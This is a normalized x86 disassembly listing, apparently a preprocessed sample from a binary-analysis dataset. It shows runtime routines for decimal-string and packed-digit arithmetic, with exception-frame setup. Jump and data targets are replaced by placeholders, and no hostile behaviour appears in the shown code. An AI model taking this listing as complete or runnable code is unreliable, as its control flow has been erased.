lea eax [ ebp - 0x28 ]
call sub_402b24
lea eax [ ebp - 0x2c ]
mov dl [ ebp - 0x1d ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_402af4
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_40426c
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_404314
jmp r-xdata
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx ebx
mov edx 0x1
call sub_404528
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
mov dl [ ebp - 0x1d ]
call sub_4041f0
push [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_404528
push [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov dl [ ebp - 0x1d ]
call sub_4041f0
push [ ebp - 0x3c ]
lea ecx [ ebp - 0x40 ]
mov edx ebx
neg edx
mov al 0x30
call sub_4046b8
push [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
sub_46c938
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov eax esi
call sub_4042c8
mov [ ebp - 0xa ] ax
mov eax esi
call sub_4044c8
movsx edi [ ebp - 0xa ]
mov edx edi
dec edx
add eax edx
mov [ ebp - 0x8 ] eax
mov edx edi
inc edx
mov eax ebx
call sub_404654
mov eax [ ebx ]
call sub_4044c8
movsx edx [ ebp - 0xa ]
add eax edx
mov [ ebp - 0x4 ] eax
push ecx
push edi
push esi
push ebx
mov bh 0xa
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov cx [ ebp - 0xa ]
mov dx 0x0
add dl 0x30
mov [ edi ] dl
pop ebx
pop esi
pop edi
pop ecx
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov al [ esi ]
sub esi 0x1
sub al 0x30
mul [ ebp + 0xc ]
add ax dx
mov dx 0x0
div bh
mov dl al
add ah 0x30
mov [ edi ] ah
sub edi 0x1
sub cx 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax [ ebx ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404528
cmp cx 0x0
je r-xdata
sub_46c9ec
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46cc50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_4042c8
push eax
mov eax edi
call sub_4042c8
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx edi
mov eax esi
call sub_46c180
mov eax [ ebp - 0x1c ]
call sub_4042c8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_4042c8
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
call sub_4044c8
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_404008
mov esi [ ebp - 0xc ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_40405c
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jge r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov al [ edi + esi ]
sub al 0x30
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_46c938
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_404314
mov eax [ ebp - 0x1c ]
call sub_408480
xor edx edx
mov dl [ edi + esi ]
sub edx 0x30
imul edx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408430
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_404314
jmp r-xdata
push ebx
mov eax [ ebx ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404528
cmp [ ebp - 0x4 ] 0xffffff01
je r-xdata
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_46c3e8
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
call sub_4040a0
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4042d0
dec esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc57
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_40402c
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_40402c
retn
mov eax [ ebx ]
call sub_4042c8
mov esi eax
sub esi [ ebp - 0x4 ]
test esi esi
jne r-xdata
test esi esi
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x40 ]
call sub_402b24
lea eax [ ebp - 0x44 ]
mov dl [ ebp - 0x29 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov cl 0x2
call sub_402af4
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
call sub_40426c
mov edx [ ebp - 0x3c ]
mov ecx [ ebx ]
mov eax ebx
call sub_404314
jmp r-xdata
test esi esi
jge r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx ]
mov ecx esi
mov edx 0x1
call sub_404528
push [ ebp - 0x48 ]
lea eax [ ebp - 0x4c ]
mov dl [ ebp - 0x29 ]
call sub_4041f0
push [ ebp - 0x4c ]
lea eax [ ebp - 0x50 ]
push eax
lea edx [ esi + 0x1 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
call sub_404528
push [ ebp - 0x50 ]
mov eax ebx
mov edx 0x3
call sub_404388
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
cmp eax 0x400
jle r-xdata
lea eax [ ebp - 0x54 ]
mov dl [ ebp - 0x29 ]
call sub_4041f0
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
mov edx esi
neg edx
mov al 0x30
call sub_4046b8
push [ ebp - 0x58 ]
push [ ebx ]
mov eax ebx
mov edx 0x3
call sub_404388
mov eax ebx
call sub_404008
sub_46cc70
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x1 ]
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x2 ] al
push eax
push ebx
push ecx
push edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x1 ] 0x0
mov cl 0x0
mov ch 0x0
mov ah [ ebp + 0x8 ]
mov dl 0x0
mov dh 0x0
cmp al 0x0
je r-xdata
add dh al
mov dl 0x1
cmp cl 0x0
jne r-xdata
cmp al [ ebp - 0x2 ]
je r-xdata
cmp dh 0x6b
ja r-xdata
mov cl 0x1
mov dl 0x0
mov edi [ ebp + 0xc ]
jmp r-xdata
mov al [ edi ]
add edi 0x1
cmp dl 0x0
jne r-xdata
add ch 0x1
jmp r-xdata
cmp ch ah
ja r-xdata
add ah 0x1
pop edi
pop edx
pop ecx
pop ebx
pop eax
mov al [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0xc
mov [ ebp - 0x1 ] 0x1
sub_46cce0
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov eax esi
call sub_4042c8
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc edi
dec eax
jne r-xdata
sub dl 0x2
je r-xdata
mov dl [ esi + edi - 0x1 ]
sub dl 0x2e
je r-xdata
xor ebx ebx
jmp r-xdata
sub_46cd14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46cce0
test al al
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
call sub_46cce0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4044c8
push eax
mov eax esi
call sub_4044c8
push eax
push 0x9
call sub_46cc70
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46c9ec
mov ecx edi
mov edx esi
mov eax ebx
call sub_46c74c
jmp r-xdata
sub_46cd84
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46ce25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40405c
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax [ ebx ]
mov edx edi
call sub_46c0cc
test eax eax
jge r-xdata
mov eax [ esi ]
call sub_408480
inc eax
lea edx [ ebp - 0x8 ]
call sub_408344
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40405c
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov edx edi
call sub_46c548
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_46c090
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ce2c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40402c
retn
sub_46ce44
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46cfc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_40405c
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x30
je r-xdata
push edi
mov eax [ edi ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ edi ]
mov edx 0x2
call sub_404528
test si si
jne r-xdata
test si si
jle r-xdata
mov ecx [ edi ]
mov eax edi
mov edx r-xdata
call sub_404314
jmp r-xdata
mov eax [ edi ]
call sub_4042c8
movsx edx si
neg edx
cmp eax edx
jg r-xdata
mov edx r-xdata
lea eax [ ebp - 0xc ]
call sub_402b24
lea eax [ ebp - 0x10 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov cl 0x2
call sub_402af4
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_40426c
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x14 ]
movsx edx si
mov al 0x30
call sub_4046b8
push [ ebp - 0x14 ]
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404388
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cfd0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ edi ]
call sub_4042c8
movsx edx si
neg edx
cmp eax edx
jle r-xdata
mov eax [ edi ]
call sub_4042c8
movsx edx si
neg edx
sub edx eax
lea ecx [ ebp - 0x18 ]
mov al 0x30
call sub_4046b8
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4042d0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
movsx ecx si
neg ecx
mov eax [ edi ]
mov edx 0x1
call sub_404528
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_4041f0
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
call sub_4042c8
mov ecx eax
movsx edx si
neg edx
inc edx
mov eax [ edi ]
call sub_404528
push [ ebp - 0x24 ]
mov eax edi
mov edx 0x3
call sub_404388
sub_46cfe8
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46d243
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0xd ]
call sub_4041f0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40460c
mov esi eax
test si si
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov esi eax
dec esi
mov eax ebx
mov edx r-xdata
call sub_40405c
mov eax ebx
mov edx r-xdata
call sub_40405c
sub si 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov al [ eax ]
cmp al [ ebp - 0xd ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx esi
dec edx
mov eax [ ebx ]
call sub_46ce44
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_40405c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov edx eax
dec edx
lea ecx [ ebp - 0x24 ]
mov al 0x30
call sub_4046b8
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_404314
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_404414
jne r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xd ]
call sub_4041f0
mov edx [ ebp - 0x1c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40ce8c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_4040a0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d24a
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_40402c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4040a0
mov eax [ ebp - 0xc ]
call sub_4042c8
mov edi eax
dec edi
lea ecx [ ebp - 0x2c ]
movsx edx di
mov al 0x30
call sub_4046b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
call sub_4042d0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46c0cc
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404414
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
cmp [ eax ] 0x30
je r-xdata
mov eax ebx
call sub_404008
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042d0
mov eax ebx
mov edx r-xdata
call sub_4042d0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
dec esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404414
je r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov edx esi
call sub_46ce44
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_40405c
mov eax [ ebx ]
call sub_4042c8
movsx edx di
add edx 0x40
cmp eax edx
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46cd84
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_4042d0
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_404314
sub_46d27c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
mov eax [ ebp - 0x8 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46d3d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov al [ eax ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
pop edx
cmp dl [ eax ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov bl [ eax ]
cmp bl 0x2d
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
mov al 0x1
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
mov eax [ ebp - 0x4 ]
call sub_4044c8
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404528
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404528
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46cfe8
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_46cd14
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40405c
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d3e0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
sub_46d3f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d4d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46cce0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax esi
call sub_46cce0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax edi
mov edx ebx
call sub_40405c
jmp r-xdata
test ebx ebx
je r-xdata
mov edx esi
mov eax ebx
call sub_40806c
test eax eax
jne r-xdata
mov eax edi
mov ecx ebx
mov edx r-xdata
call sub_404314
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4d7
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax edi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_404414
jne r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46d27c
mov eax edi
mov edx r-xdata
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
call sub_46b660
jmp r-xdata
sub_46d540
cmp cl ch
jae r-xdata
retn
mov ah dl
add cl 0x1
cmp cl ch
jne r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
mov al 0x0
jmp r-xdata
and ah 0xf
shl ah 0x4
or ah al
mov al ah
stosb [ edi ]
add cl 0x1
jmp sub_46d540
sub_46d578
push ebp
mov ebp esp
push esi
push edi
push ebx
push ecx
push edx
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov cl [ ebp + 0x10 ]
mov ch [ ebp + 0xc ]
cmp cl [ ebp + 0x18 ]
ja r-xdata
sub cl [ ebp + 0x18 ]
cmp cl [ ebp + 0x18 ]
je r-xdata
mov ch [ ebp + 0xc ]
mov cl [ ebp + 0x18 ]
cmp ch [ ebp + 0x14 ]
jae r-xdata
sub cl 0x1
cmp cl 0x0
je r-xdata
add cl [ ebp + 0x14 ]
call sub_46d530
cmp ch [ ebp + 0x14 ]
je r-xdata
mov ah [ ebp + 0x18 ]
sub ah [ ebp + 0x10 ]
mov cl [ ebp + 0x18 ]
add cl [ ebp + 0x14 ]
add cl ch
jmp r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
or al 0x0
stosb [ edi ]
mov al dl
mov ah [ ebp + 0x18 ]
mov [ ebp + 0x10 ] ah
mov cl 0x1
jmp r-xdata
mov al 0x0
stosb [ edi ]
sub cl 0x1
jmp r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ebp
retn 0x18
mov cl ch
call sub_46d568
jmp r-xdata
lodsb [ esi ]
cmp al 0x0
je r-xdata
sub cl [ ebp + 0x18 ]
call sub_46d568
call sub_46d530
mov cl [ ebp + 0x10 ]
cmp cl [ ebp + 0x18 ]
jbe r-xdata
mov dl al
cmp ch [ ebp + 0x14 ]
jbe r-xdata
cmp cl 0x0
je r-xdata
sub ah 0x1
cmp ah 0x0
je r-xdata
mov [ edi ] al
add edi 0x1
add ch [ ebp + 0x10 ]
mov cl 0x0
call sub_46d540
mov cl [ ebp + 0xc ]
cmp cl [ ebp + 0x14 ]
jbe r-xdata
mov ch [ ebp + 0x14 ]
sub ah 0x1
sub cl 0x2
jmp r-xdata
sub cl [ ebp + 0x14 ]
call sub_46d568
jmp r-xdata
cmp ah 0x0
je r-xdata
sub_46d65c
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
push esi
push edi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov cx [ ebp + 0x8 ]
mov dl 0x0
cld
loop r-xdata
sub al 0x30
cmp dl 0x0
jne r-xdata
lodsb [ esi ]
cmp al [ ebp - 0x1 ]
je r-xdata
cmp dl 0x0
je r-xdata
or al ah
stosb [ edi ]
shl al 0x4
mov ah al
jmp r-xdata
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov al ah
stosb [ edi ]
not dl
sub_46d6a8
push ebx
push esi
push edi
add esp 0xffffffdc
mov edx [ rw-data ]
mov dl [ edx ]
mov [ esp + 0x1 ] dl
mov esi eax
mov [ esp ] 0x0
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
push esi
mov esi r-xdata
lea edi [ esp + 0x8 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
and eax 0xff
bts [ esp + 0x4 ] eax
and ebx 0xff
bt [ esp + 0x4 ] ebx
jb r-xdata
mov al [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc esi
mov [ esp ] 0x1
jmp r-xdata
sub_46d728
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46d8fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax esi
call sub_4044c8
call sub_46d6a8
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404414
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c40
jmp r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d904
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x6 ] 0x0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0xc ]
mov edx esi
call sub_40460c
mov edi eax
mov eax esi
call sub_4044c8
mov ebx eax
jmp r-xdata
mov al [ ebx ]
mov edx eax
and edx 0xff
bt [ rw-data ] edx
jb r-xdata
inc ebx
test di di
jbe r-xdata
cmp al 0x30
je r-xdata
dec edi
mov eax ebx
call sub_408994
lea esi [ ebx + eax - 0x1 ]
jmp r-xdata
mov al [ esi ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
mov [ esi ] 0x0
dec esi
cmp [ ebx ] 0x2d
jne r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x6 ] 0x1
test di di
jbe r-xdata
inc ebx
cmp al 0x2b
jne r-xdata
dec edi
mov eax ebx
call sub_408994
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0x40
jbe r-xdata
inc ebx
test di di
jbe r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax esi
xor ecx ecx
mov edx 0x20
call sub_402c40
cmp [ ebx ] 0x30
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
test di di
jbe r-xdata
dec edi
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
push esi
push ebx
mov ax [ ebp - 0x8 ]
push eax
call sub_46d65c
jmp r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
jmp r-xdata
cmp di 0x40
ja r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov al [ ebp - 0x8 ]
mov edx eax
dec edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
cmp [ ebp - 0x6 ] 0x0
je r-xdata
test di di
jbe r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x80
jmp r-xdata
mov edx edi
sub al dl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
mov edx edi
sub al dl
add al 0x80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
sub_46d91c
push ebp
mov ebp esp
push ecx
push esi
push ebx
mov esi [ ebp + 0xc ]
mov cx [ ebp + 0x8 ]
cld
mov [ ebp - 0x2 ] cx
pop ebx
pop esi
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn 0x8
lodsb [ esi ]
cmp al 0x0
jne r-xdata
shr al 0x4
cmp al 0x0
jne r-xdata
sub cx 0x1
cmp cx 0x0
je r-xdata
sub cx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46d960
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
sub dl al
call sub_46d520
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
sub dl al
call sub_46d520
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46da18
push ebp
